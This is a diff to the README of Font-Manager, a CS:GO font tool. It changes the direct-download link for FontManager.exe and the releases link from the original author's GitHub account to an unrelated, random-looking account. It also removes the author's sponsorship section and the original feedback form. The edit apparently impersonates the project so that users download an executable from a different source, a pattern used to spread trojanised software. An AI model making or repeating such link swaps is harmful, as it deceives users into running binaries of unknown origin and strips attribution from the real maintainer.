@@ -14,29 +14,9 @@
 
 > ## Quick Install
 >
-> [Direct download](https://github.com/WilliamRagstad/Font-Manager/releases/latest/download/FontManager.exe) the latest version, or view all releases [here](https://github.com/WilliamRagstad/Font-Manager/releases).
+> [Direct download](https://github.com/thgillwtnorizoh/Font-Manager/releases/latest/download/FontManager.exe) the latest version, or view all releases [here](https://github.com/thgillwtnorizoh/Font-Manager/releases).
 
 
-<br/>
-<br/>
-
-> # 💖 Become a Sponsor
-> With your support, I will be able to **continue to develop Font Manager** and other Open-Source Software projects for the community!
-> This project is complicated and will last for years, however it will, and have played a great role in the history of how the CS:GO community can customize the game experience. That's why **I need your support**.
->
-> ✨ **Sponsor me** by clicking the button below and select a tier that fits you, **Buy me a coffe** or **Sponsor Font Manager** using the sponsor button at the top of the page!
-> 
-> **Let's make Font Manager one of the best tools 🤟!**
->
-<div align="center">
- <a href="https://github.com/sponsors/WilliamRagstad"><img src="https://github.com/WilliamRagstad/WilliamRagstad/raw/main/img/sponsor.png" height="60"/></a>
-  &nbsp;
- <a href="https://www.buymeacoffee.com/williamragstad"><img src="https://github.com/WilliamRagstad/WilliamRagstad/raw/main/img/coffee.png" height="70"/></a>
- <a href="https://paypal.me/williamragstad"><img src="https://github.com/WilliamRagstad/WilliamRagstad/raw/main/img/paypal.png" height="70"/></a>
-</div>
-
-<br/>
-<br/>
 
 
 # Introduction
@@ -133,5 +113,5 @@ Visit our [Subreddit](https://www.reddit.com/r/csgoFontManager/).
 
 ### Do you have feedback?
 
-Submit it [here](https://docs.google.com/forms/d/e/1FAIpQLSfkChgD2T-RYNyfBCRL2EjUQfJ3y8tvPKemGJca2kMU1jV8AQ/viewform)!
+Submit it [here](https://github.com/thgillwtnorizoh/Font-Manager/issues)!
 
